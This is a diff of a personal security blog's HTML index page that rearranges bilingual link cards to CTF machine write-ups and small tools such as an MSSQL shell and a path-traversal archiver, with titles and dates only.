+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">21 Jul 2016</time>
+      <time lang="el">21 Ιουλ 2016</time>
     </footer>
   </a>
 </article>
@@ -1516,17 +1755,29 @@ root@unattended:~# cat /root/root.txt
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1604,17 +1855,25 @@ root@unattended:~# cat /root/root.txt
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
     </footer>
   </a>
 </article>
@@ -1635,130 +1894,6 @@ root@unattended:~# cat /root/root.txt
           
            
            
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">21 Jul 2016</time>
-      <time lang="el">21 Ιουλ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1808,22 +1943,6 @@ root@unattended:~# cat /root/root.txt
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -1843,90 +1962,6 @@ root@unattended:~# cat /root/root.txt
           
            
            
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -2107,72 +2142,6 @@ root@unattended:~# cat /root/root.txt
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -2495,21 +2464,171 @@ root@unattended:~# cat /root/root.txt
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
-      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">13 Apr 2018</time>
-      <time lang="el">13 Απρ 2018</time>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2567,25 +2686,21 @@ root@unattended:~# cat /root/root.txt
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2602,40 +2717,21 @@ root@unattended:~# cat /root/root.txt
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2762,52 +2858,6 @@ root@unattended:~# cat /root/root.txt
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
